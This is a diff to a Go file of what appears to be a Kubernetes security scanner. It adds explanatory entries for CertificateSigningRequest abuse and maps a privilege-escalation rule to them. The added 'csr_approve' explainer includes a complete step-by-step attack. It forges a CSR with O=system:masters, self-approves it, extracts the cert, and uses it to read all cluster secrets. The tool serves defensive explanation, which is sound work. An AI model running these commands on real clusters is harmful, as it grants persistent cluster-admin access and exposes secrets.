@@ -213,9 +213,10 @@ var Glossary = map[string]GlossaryEntry{
 		Long:  template.HTML(`<p>A <strong>LimitRange</strong> declares per-namespace default <code>requests</code> / <code>limits</code> for pod and container resources, plus optional <code>min</code> / <code>max</code> bounds the kube-apiserver enforces at admission. When a pod is created without explicit resources, the LimitRange default is injected, so authors who forget the limits no longer ship <code>BestEffort</code> workloads by accident. Combined with a namespace <code>ResourceQuota</code> the pair gives operators a default-on baseline (LimitRange) plus a hard cap (ResourceQuota), which together prevent both noisy-neighbor failures and unbounded resource consumption from a single misconfiguration.</p>`),
 	},
 	"CertificateSigningRequest": {
-		Title: "CertificateSigningRequest",
-		Short: "API resource for requesting a signed client / serving certificate from the cluster CA.",
-		Long:  "",
+		Title:  "CertificateSigningRequest",
+		Short:  "API resource for requesting a signed client / serving certificate from the cluster CA.",
+		Long:   template.HTML(`<p>A <strong>CertificateSigningRequest</strong> (CSR) carries an x509 signing request that asks the cluster's CA to issue a certificate. The signer is named via <code>spec.signerName</code> (e.g. <code>kubernetes.io/kube-apiserver-client</code> for API authentication, <code>kubernetes.io/kubelet-serving</code> for node serving certs). The CSR's Subject DN is attacker-controlled: the <code>CN</code> becomes the authenticated User and each <code>O</code> (Organization) becomes a Group.</p><p>Two RBAC verbs control the lifecycle: <code>create</code> on <code>certificatesigningrequests</code> lets you submit a CSR, and <code>update</code>/<code>patch</code> on the <code>certificatesigningrequests/approval</code> subresource lets you mark it Approved. The kube-controller-manager then signs whatever was approved. Holding both verbs is equivalent to cluster-admin: submit a CSR with <code>O=system:masters</code>, self-approve, retrieve the signed cert, and authenticate as <code>system:masters</code> (which the apiserver hard-codes as cluster-admin). Cert lifetime is whatever the signer applies (often a year), and revoking the original RBAC grant does not invalidate already-issued certs.</p>`),
+		DocURL: "https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/",
 	},
 }
 
@@ -333,6 +334,18 @@ var Techniques = map[string]TechniqueExplainer{
 		Plain: template.HTML(`<p>The <code>nodes/proxy</code> subresource forwards requests to the kubelet on each node. Combined with kubelet's <code>/exec</code> endpoint and a WebSocket verb mismatch, this becomes a primitive for executing commands inside any pod the kubelet can reach.</p>`),
 		Mitre: "T1611 — Escape to Host",
 	},
+	"csr_approve": {
+		Title: "CSR self-approval to system:masters",
+		Plain: template.HTML(`<p>The combination of <code>create</code> on <code>certificatesigningrequests</code> AND <code>update</code>/<code>patch</code> on <code>certificatesigningrequests/approval</code> at cluster scope lets the holder mint a kubelet-signed x509 client cert carrying any Subject DN they choose. Setting the Organization to <code>system:masters</code> produces a credential that the apiserver authorizes as cluster-admin regardless of RBAC.</p><p>This is a permanent backdoor primitive: the cert validity is whatever the signer applies (often a year), and revoking the original RBAC grant does not invalidate it — only a CA rotation does. The Kubernetes project lists this in RBAC Good Practices as a privilege-escalation risk on par with direct <code>impersonate</code>.</p>`),
+		Mitre: "T1098.001 — Account Manipulation: Additional Cloud Credentials",
+		AttackerSteps: []AttackerStep{
+			{Note: "Generate a private key and CSR locally with system:masters in the Subject", Cmd: "openssl req -new -newkey rsa:2048 -nodes -keyout admin.key -subj '/CN=attacker/O=system:masters' -out admin.csr"},
+			{Note: "Submit the CSR to the kube-apiserver-client signer", Cmd: "kubectl apply -f - <<EOF\napiVersion: certificates.k8s.io/v1\nkind: CertificateSigningRequest\nmetadata: {name: takeover}\nspec:\n  request: $(base64 -w0 admin.csr)\n  signerName: kubernetes.io/kube-apiserver-client\n  usages: [client auth]\nEOF"},
+			{Note: "Self-approve the CSR", Cmd: "kubectl certificate approve takeover"},
+			{Note: "Extract the signed cert", Cmd: "kubectl get csr takeover -o jsonpath='{.status.certificate}' | base64 -d > admin.crt"},
+			{Note: "Use it as cluster-admin", Cmd: "kubectl --client-certificate=admin.crt --client-key=admin.key get secrets -A"},
+		},
+	},
 	"pod_host_escape": {
 		Title: "Container escape to host",
 		Plain: template.HTML(`<p>The pod is configured in a way that makes escaping to the underlying node trivial: <code>privileged: true</code>, <code>hostPID</code>, <code>hostNetwork</code>, or a sensitive <code>hostPath</code> mount (root, docker.sock, etc.). An attacker who controls the container reaches root on the node, then has access to every pod and kubelet credential on that node.</p>`),
@@ -423,6 +436,8 @@ func TechniqueKeyForFinding(f models.Finding) string {
 		return "bind_or_escalate"
 	case f.RuleID == "KUBE-PRIVESC-010":
 		return "modify_role_binding"
+	case f.RuleID == "KUBE-PRIVESC-011":
+		return "csr_approve"
 	case f.RuleID == "KUBE-PRIVESC-012":
 		return "nodes_proxy"
 	case f.RuleID == "KUBE-PRIVESC-014":
